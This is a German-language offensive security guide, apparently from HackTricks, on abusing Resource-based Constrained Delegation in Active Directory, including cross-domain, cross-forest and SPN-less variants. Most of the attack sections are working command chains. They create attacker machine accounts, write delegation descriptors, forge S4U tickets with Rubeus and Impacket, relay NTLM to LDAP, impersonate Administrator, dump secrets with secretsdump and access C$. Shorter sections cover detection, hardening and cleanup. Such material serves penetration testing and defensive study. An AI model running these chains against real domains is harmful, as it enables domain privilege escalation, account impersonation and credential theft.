# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Grundlagen der Resource-based Constrained Delegation

Dies ähnelt der grundlegenden [Constrained Delegation](constrained-delegation.md), aber **anstatt** einem **Objekt** Berechtigungen zu geben, **sich als beliebiger Benutzer gegenüber einem Computer auszugeben**, **legt** die Resource-based Constrained Delegation **im Objekt fest, wer sich als beliebiger Benutzer gegenüber ihm ausgeben darf**.<sup>[[12]](#references)</sup>

In diesem Fall verfügt das eingeschränkte Objekt über ein Attribut namens _**msDS-AllowedToActOnBehalfOfOtherIdentity**_, das den Namen des Benutzers enthält, der sich gegenüber ihm als jeder andere Benutzer ausgeben kann.

Ein weiterer wichtiger Unterschied dieser Constrained Delegation zu den anderen Delegationsarten besteht darin, dass jeder Benutzer mit **Schreibberechtigungen über ein Computerkonto** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) **_msDS-AllowedToActOnBehalfOfOtherIdentity_** festlegen kann (bei den anderen Formen der Delegation benötigte man Domain-Admin-Rechte).<sup>[[1]](#references)</sup>

### Neue Konzepte

Bei der Constrained Delegation wurde erklärt, dass das **`TrustedToAuthForDelegation`**-Flag innerhalb des _userAccountControl_-Werts des Benutzers erforderlich ist, um ein **S4U2Self** durchzuführen. Das ist jedoch nicht vollständig korrekt.\
Tatsächlich kann man auch ohne diesen Wert ein **S4U2Self** gegenüber jedem Benutzer durchführen, wenn man ein **Service** ist (über einen SPN verfügt). Wenn man jedoch **`TrustedToAuthForDelegation`** besitzt, ist das zurückgegebene TGS **Forwardable**, und wenn man dieses Flag **nicht besitzt**, ist das zurückgegebene TGS **nicht Forwardable**.<sup>[[5]](#references)</sup>

Wenn das bei **S4U2Proxy** verwendete **TGS** jedoch **nicht Forwardable** ist, funktioniert der Versuch, eine **grundlegende Constrained Delegation** zu missbrauchen, **nicht**. Wenn man jedoch versucht, eine Resource-based Constrained Delegation auszunutzen, wird es funktionieren.<sup>[[1]](#references)[[2]](#references)</sup>

### Angriffsstruktur

> Wenn du **Schreibäquivalenzberechtigungen** über ein **Computer**-Konto hast, kannst du **privilegierten Zugriff** auf diesem Computer erlangen.

Angenommen, der Angreifer verfügt bereits über **Schreibäquivalenzberechtigungen über den betroffenen Computer**.

1. Der Angreifer **kompromittiert** ein Konto, das über einen **SPN** verfügt, oder **erstellt eines** („Service A“). Beachte, dass jeder _Admin User_ ohne weitere spezielle Berechtigungen bis zu 10 Computerobjekte (**_MachineAccountQuota_**) **erstellen** und ihnen einen **SPN** zuweisen kann. Der Angreifer kann daher einfach ein Computerobjekt erstellen und ihm einen SPN zuweisen.
2. Der Angreifer **missbraucht seine WRITE-Berechtigung** über den betroffenen Computer (ServiceB), um eine **Resource-based constrained delegation** zu konfigurieren, die ServiceA erlaubt, sich gegenüber diesem betroffenen Computer (ServiceB) als beliebiger Benutzer auszugeben.
3. Der Angreifer verwendet Rubeus, um einen **vollständigen S4U-Angriff** (S4U2Self und S4U2Proxy) von Service A zu Service B für einen Benutzer **mit privilegiertem Zugriff auf Service B** durchzuführen.
1. S4U2Self (vom kompromittierten/erstellten Konto mit dem SPN): Fordere ein **TGS von Administrator zu mir** an (nicht Forwardable).
2. S4U2Proxy: Verwende das **nicht Forwardable TGS** aus dem vorherigen Schritt, um ein **TGS** von **Administrator** für den **betroffenen Host** anzufordern.
3. Auch wenn du ein nicht Forwardable TGS verwendest, wird es funktionieren, da du eine Resource-based Constrained Delegation ausnutzt.
4. Der Angreifer kann **Pass-the-Ticket** verwenden und sich als der Benutzer **ausgeben**, um **Zugriff auf den betroffenen ServiceB** zu erlangen.<sup>[[1]](#references)</sup>

Um die _**MachineAccountQuota**_ der Domain zu überprüfen, kannst du Folgendes verwenden:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Angriff

### Erstellen eines Computerobjekts

Sie können mithilfe von **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup> ein Computerobjekt innerhalb der Domäne erstellen.
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurieren der ressourcenbasierten eingeschränkten Delegation

**Verwendung des activedirectory PowerShell-Moduls**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Mit powerview**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Durchführen eines vollständigen S4U-Angriffs (Windows/Rubeus)

Zunächst haben wir das neue Computer-Objekt mit dem Passwort `123456` erstellt, daher benötigen wir den Hash dieses Passworts:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Dies gibt die RC4- und AES-Hashes für dieses Konto aus.\
Nun kann der Angriff durchgeführt werden:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Sie können weitere Tickets für weitere Services generieren, indem Sie mit dem `/altservice`-Parameter von Rubeus nur einmal fragen:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Beachte, dass Benutzer ein Attribut namens "**Cannot be delegated**" haben. Wenn dieses Attribut bei einem Benutzer auf True gesetzt ist, kannst du dich nicht als dieser Benutzer ausgeben. Diese Eigenschaft ist in BloodHound sichtbar.

### Linux tooling: vollständiges RBCD mit Impacket (2024+)

Wenn du von Linux aus arbeitest, kannst du die vollständige RBCD-Kette mit den offiziellen Impacket-Tools durchführen:<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Hinweise
- Wenn LDAP signing/LDAPS erzwungen wird, verwende `impacket-rbcd -use-ldaps ...`.
- Bevorzuge AES keys; viele moderne Domains schränken RC4 ein. Impacket und Rubeus unterstützen beide AES-only flows.
- Impacket kann für einige Tools den `sname` ("AnySPN") umschreiben, aber ermittle nach Möglichkeit den korrekten SPN (z. B. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## Domainübergreifendes und forestübergreifendes RBCD

Wenn der **delegating principal**, den du kontrollierst, in einer **anderen Domain** (oder sogar einem **anderen forest**) als der **resource computer** liegt, handelt es sich weiterhin um **RBCD**, aber der Ticket flow entspricht nicht mehr dem üblichen Single-Domain-Ablauf `S4U2Self -> S4U2Proxy`.

### Domainübergreifendes RBCD: den foreign principal per SID konfigurieren

Wenn du `msDS-AllowedToActOnBehalfOfOtherIdentity` aus einer **anderen Domain** setzt, ist der foreign machine/user im LDAP der Zieldomain möglicherweise **nicht per Name auflösbar**. Konfiguriere in diesem Fall den Delegationseintrag anhand der **SID** des foreign principal anstelle seines sAMAccountName/UPN.

Dies ist besonders relevant, wenn du NTLM per `ntlmrelayx.py` an LDAP relayst:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Hinweise:
- `--sid` weist `ntlmrelayx.py` an, `--escalate-user` als SID zu behandeln. Dies ist erforderlich, wenn das delegierende Konto aus einer anderen Domäne als der Zieldomäne stammt.
- Selbst wenn das Tool `User not found in LDAP` ausgibt, kann der Delegation-Schreibvorgang erfolgreich sein, da der Security Descriptor die fremde SID direkt speichert.

### Domänenübergreifendes RBCD: Cross-Realm-S4U-Sequenz

Sobald der fremde Principal in `msDS-AllowedToActOnBehalfOfOtherIdentity` eingetragen ist, sieht der funktionierende domänenübergreifende Ablauf folgendermaßen aus:<sup>[[9]](#references)[[13]](#references)</sup>

1. Einen **TGT** für den delegierenden Principal aus seiner eigenen Domäne abrufen.
2. Einen **Referral-TGT** für `krbtgt/<target-domain>` anfordern.
3. Eine **Cross-Realm-S4U2Self-Referral** für den zu impersonierenden Benutzer beim DC der Zieldomäne anfordern.
4. Das eigentliche **S4U2Self**-Ticket für diesen Benutzer wieder in der delegierenden Domäne anfordern.
5. **S4U2Proxy** in der delegierenden Domäne durchführen, um ein Referral-Ticket für die Zieldomäne zu erhalten.
6. Das abschließende **S4U2Proxy** beim DC der Zieldomäne durchführen, um das Service-Ticket für `cifs/host.target`, `host/host.target` usw. zu erhalten.

Aus diesem Grund schlägt gewöhnliches Linux-Tooling bei domänenübergreifendem RBCD häufig fehl:<sup>[[9]](#references)</sup>
- Der **Realm** der Anfrage muss möglicherweise vom Realm des im `TGS-REQ` verwendeten TGT abweichen.
- Die Kette benötigt **unabhängige S4U2Proxy-Schritte**, nicht nur **S4U2Self** oder **S4U2Self**, unmittelbar gefolgt von einem einzelnen **S4U2Proxy**.

### Domänenübergreifendes RBCD unter Linux

Synacktiv veröffentlichte eine Impacket-Implementierung von `getST.py`, die die Cross-Realm-Sequenz unter Linux reproduziert, indem sie die beiden KDCs explizit verarbeitet:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Operativ lauten die neuen Argumente:
- `-dc-ip`: DC der **delegierenden** Domain
- `-targetdomain`: Domain des **Ressourcencomputers**
- `-targetdc`: DC der **Ressourcen**-Domain

### Einschränkungen von Cross-forest RBCD

Cross-forest RBCD hat eine wichtige Einschränkung: **Der impersonated user muss derselben Forest wie der delegating principal angehören**. Wenn sich dein kontrolliertes Maschinenkonto also in `valhalla.local` befindet und die Zielressource in `asgard.local`, kannst du im Allgemeinen **keine beliebigen `asgard.local`-Benutzer** über RBCD gegenüber dieser Ressource impersonaten.<sup>[[9]](#references)</sup>

Es ist weiterhin ausnutzbar, wenn:
- der Benutzer aus der **delegating forest** ein **local admin** (oder anderweitig privilegiert) auf dem Ressourcenhost in der anderen Forest ist
- ein Trust den erforderlichen Authentication-Pfad erlaubt und die fremde SID im Security Descriptor des Zielcomputers akzeptiert wird

### Protokollbesonderheiten von Cross-forest RBCD

Cross-forest RBCD ist nicht einfach nur „cross-domain plus ein Trust“. Der beobachtete Ablauf umfasst zwei Besonderheiten, die gängige Tools historisch übersehen:<sup>[[9]](#references)</sup>

1. Eine zusätzliche **S4U2Proxy**-Anfrage, die **`PA-PAC-OPTIONS=branch-aware`** setzt
2. Ein finales Service Ticket, das möglicherweise über **RC4** zurückgegeben wird, selbst wenn andere Etypes angefordert wurden

Der praktische Ablauf ist:

1. Einen TGT für den delegating principal in Forest A beschaffen.
2. **S4U2Self** für den impersonated user in Forest A anfordern.
3. **S4U2Proxy** in Forest A anfordern, um ein Referral-TGT für Forest B zu erhalten.
4. Ein zweites **S4U2Proxy** in Forest A **ohne das S4U2Self-Ticket als zusätzliches Ticket**, aber mit aktiviertem `branch-aware`, senden, um ein weiteres Referral-TGT für Forest B zu erhalten.
5. Optional ein normales Service Ticket in Forest B für den delegating principal anfordern (dieses Ticket wird für den finalen Abuse nicht benötigt).
6. Die Referral-Tickets aus den Schritten 3 und 4 verwenden, um das finale **S4U2Proxy**-Ticket in Forest B für den impersonated forest-A user gegenüber dem Ziel-SPN anzufordern.

### Cross-forest RBCD von Linux aus

Der gleiche Synacktiv-Impacket-Branch ergänzt für diese Logik einen `-forest`-Switch:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Rekursives domänenübergreifendes RBCD (3+ Domänen)

In **Forests mit mehreren Domänen** können sowohl **S4U2Self** als auch **S4U2Proxy** **rekursiv** sein, anstatt nach einer Weiterleitung zu stoppen:

- **Rekursives S4U2Self**: Das erste `S4U2Self` wird an die **Domäne des impersonierten Benutzers** gesendet, die Zwischenwechsel zwischen übergeordneten und untergeordneten Domänen werden mit normalen `TGS-REQ`-Weiterleitungen für `krbtgt/<REALM>` durchlaufen, und das **abschließende `S4U2Self`** wird in der **eigenen Domäne des delegierenden Principals** gesendet.
- Das bedeutet, dass bereits das **Besitzen eines TGTs** für ein Computerkonto ausreichen kann, um sich als **Administrator aus einer anderen Domäne im selben Forest** auszugeben und `cifs/host`, `host/host`, `wsman/host` usw. anzufordern.
- **Rekursives S4U2Proxy** folgt der Trust-Kette auf dieselbe Weise: Zwischenwechsel verwenden das vorherige Ticket erneut als TGT, während die nächste `krbtgt/<REALM>`-Weiterleitung angefordert wird. Erst der letzte Wechsel gibt das abschließende Service-Ticket zurück.<sup>[[10]](#references)</sup>

Ein praktisches Beispiel innerhalb desselben Forests ist:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less cross-domain / cross-forest RBCD

Wenn der **delegating principal ein Benutzer ohne SPN** ist, schlägt das letzte rekursive `S4U2Self` mit **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** fehl. Der Workaround besteht darin, **nur den letzten Hop als `S4U2Self+U2U`** zu wiederholen.<sup>[[10]](#references)</sup>

Kurzfassung der Abuse-Kette:

1. Mit dem **NT hash** authentifizieren, damit der KDC zu **RC4-HMAC (etype 23)** gedrängt wird.
2. Zuerst **`-self -u2u`** anfordern und dieses Ticket getrennt vom späteren Proxy-Schritt aufbewahren.
3. Den **TGT session key** mit `describeTicket.py` extrahieren.
4. Den **NT hash** des Benutzers mit diesem **session key** über `changepasswd.py -newhashes <session_key>` ersetzen.
5. Das `S4U2Self+U2U`-Ticket bei einer separaten **`-proxy`**-Anfrage erneut als **`-additional-ticket`** verwenden.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Betriebliche Hinweise:

- Wenn der **erste vertrauenswürdige Hop bereits eine andere Forest ist**, sollte der **branch-aware** Algorithmus (`getST.py ... -forest`) bevorzugt werden, um das native Verhalten von Windows abzubilden. Wenn die fremde Forest erst **später** in der Kette erreicht wird, kann der rekursive Flow ohne Branch-Erkennung weiterhin funktionieren.<sup>[[9]](#references)</sup>
- Auf aktuellen **Windows Server 2022/2025**-DCs kann erzwungenes RC4 aufgrund der veralteten RC4-Unterstützung mit **`KDC_ERR_ETYPE_NOSUPP`** fehlschlagen. Dadurch kann **SPN-less RBCD** unmöglich werden, obwohl klassisches SPN-basiertes RBCD weiterhin mit AES funktioniert.<sup>[[15]](#references)</sup>
- Führe **`S4U2Self+U2U` vor dem Ändern des Hashes/Passworts des Benutzers** aus: `SamrChangePasswordUser` berechnet die Kerberos-AES-Keys des Kontos **nicht** neu. Wird das Passwort zuerst geändert, können spätere Ticket-Anfragen fehlschlagen.<sup>[[14]](#references)</sup>
- Das impersonierte Konto muss weiterhin **delegable** sein: **Protected Users** sowie Konten mit **`NOT_DELEGATED`** / **„Account is sensitive and cannot be delegated“** blockieren die Kette.

## Hinweise zur Erkennung / Hardening

- RBCD-Pfade über Domains/Forests hinweg werden weiterhin meist durch **ACL abuse** oder **relay-to-LDAP** erstellt. Erzwinge **LDAP signing** und **LDAP channel binding** auf DCs, um gängige Setup-Pfade zu unterbrechen.
- Prüfe, wer `msDS-AllowedToActOnBehalfOfOtherIdentity` für Computerobjekte schreiben kann, und löse die gespeicherten SIDs auf, einschließlich **foreign security principals**.
- Prüfe in Umgebungen mit vielen Trusts **Selective Authentication**, **SID filtering** und ob Benutzer aus einer fremden Forest über **local admin**-Rechte auf Ressourcenhosts verfügen.

### Zugriff

Die letzte Befehlszeile führt den **vollständigen S4U-Angriff** aus und injiziert den TGS von Administrator zum Zielhost in den **Arbeitsspeicher**.\
In diesem Beispiel wurde ein TGS für den **CIFS**-Service von Administrator angefordert, sodass du auf **C$** zugreifen kannst:
```bash
ls \\victim.domain.local\C$
```
### Verschiedene Service-Tickets missbrauchen

Erfahre mehr über die [**hier verfügbaren Service-Tickets**](silver-ticket.md#available-services).

## Aufzählung, Auditierung und Bereinigung

### Computer mit konfiguriertem RBCD enumerieren

PowerShell (Dekodierung der SD zur Auflösung von SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (mit einem Befehl lesen oder leeren):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Bereinigung / Zurücksetzen von RBCD

- PowerShell (Attribut löschen):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos-Fehler

- **`KDC_ERR_ETYPE_NOTSUPP`**: Das bedeutet, dass Kerberos so konfiguriert ist, dass DES oder RC4 nicht verwendet werden, und du nur den RC4-Hash angibst. Übergib an Rubeus mindestens den AES256-Hash (oder einfach die RC4-, AES128- und AES256-Hashes). Beispiel: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** während `-self` für einen normalen Benutzer: Der delegierende Principal hat wahrscheinlich **keinen SPN**. Wiederhole den **letzten Hop** als **`S4U2Self+U2U`** statt als reguläres **`S4U2Self`**.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** während **SPN-less RBCD**: Aktuelle DCs können den erzwungenen **RC4-HMAC**-Pfad ablehnen, der für den Trick **`S4U2Self+U2U` + Session-Key-Substitution** erforderlich ist. Versuche stattdessen einen klassischen **SPN-basierten** RBCD-Pfad mit AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Das bedeutet, dass die Zeit des aktuellen Computers von der des DC abweicht und Kerberos nicht ordnungsgemäß funktioniert.
- **`preauth_failed`**: Das bedeutet, dass der angegebene Benutzername und die Hashes für die Anmeldung nicht funktionieren. Möglicherweise hast du beim Generieren der Hashes vergessen, das `$` in den Benutzernamen einzufügen (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`).
- **`KDC_ERR_BADOPTION`**: Dies kann bedeuten:
- Der Benutzer, den du impersonieren möchtest, kann nicht auf den gewünschten Service zugreifen (weil du ihn nicht impersonieren kannst oder weil er nicht über ausreichende Berechtigungen verfügt).
- Der angeforderte Service existiert nicht (wenn du ein Ticket für WinRM anforderst, WinRM aber nicht ausgeführt wird).
- Der erstellte Fakecomputer hat seine Berechtigungen für den verwundbaren Server verloren, und du musst sie wiederherstellen.
- Du missbrauchst klassisches KCD; beachte, dass RBCD mit nicht weiterleitbaren S4U2Self-Tickets funktioniert, während KCD weiterleitbare Tickets erfordert.

## Hinweise, Relays und Alternativen

- Du kannst die RBCD-SD auch über Active Directory Web Services (ADWS) schreiben, wenn LDAP gefiltert wird. Siehe:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos-Relay-Ketten enden häufig in RBCD, um in einem Schritt **local SYSTEM** zu erlangen. Siehe praktische End-to-End-Beispiele:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Wenn LDAP signing/channel binding **deaktiviert** sind und du ein Machine Account erstellen kannst, können Tools wie **KrbRelayUp** eine erzwungene Kerberos-Authentifizierung an LDAP weiterleiten, `msDS-AllowedToActOnBehalfOfOtherIdentity` für deinen Machine Account im Ziel-Computerobjekt setzen und anschließend **Administrator** via S4U von außerhalb des Hosts impersonieren.<sup>[[8]](#references)</sup>

## Referenzen

- [1] [Wagging the Dog: Missbrauch von Resource-Based Constrained Delegation zum Angriff auf Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [2] [Ein weiteres Wort zur Delegation](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Übernahme eines Computerobjekts](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Missbrauch von Resource-Based Constrained Delegation](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Killed the Domain: Ein offensiver Kerberos-Überblick](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (offiziell)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Kurzes Linux-Cheatsheet mit aktueller Syntax](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing deaktiviert → Kerberos-Relay zu RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv – Untersuchung von domain- und forest-übergreifendem RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv – Untersuchung von domain- und forest-übergreifendem RBCD: Teil 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv-Impacket-Branch – cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn – Überblick über eingeschränkte Kerberos-Delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications – Domainübergreifendes S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications – SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn – Verwendung von RC4 in Kerberos erkennen und beheben](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
